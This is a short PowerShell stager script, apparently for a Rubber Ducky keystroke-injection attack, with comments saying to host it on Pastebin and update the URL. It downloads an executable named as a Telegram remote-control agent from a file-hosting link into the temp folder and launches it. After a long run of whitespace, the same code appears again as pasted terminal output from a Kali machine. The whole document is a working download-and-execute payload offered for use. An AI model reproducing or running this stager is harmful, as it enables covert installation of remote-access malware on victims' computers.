## UPLOAD THIS FILE TO PASTEBIN THEN UPDATE THE URL IN THE DUCKYSTAGER.DUCK
## ALSO CHANGE THE URL HERE TO MATCH UPLOADED AGENT

$url = "http://download1487.mediafire.com/pvgwqzuajbjg/4ewf6i096qk10ff/telegram-agent-windows.exe"
$outpath = "$env:temp\test.exe"

$wc = new-object system.net.webclient
$wc.downloadfile($url, $outpath)

start-process -filepath $env:temp\test;#                                                                                                               💻 root@kali ~/Desktop 📡 cat telegram-stager.ps1 
$url = "http://download1487.mediafire.com/pvgwqzuajbjg/4ewf6i096qk10ff/telegram-agent-windows.exe"
$outpath = "$env:temp\test.exe"

$wc = new-object system.net.webclient
$wc.downloadfile($url, $outpath)

start-process -filepath $env:temp\test;
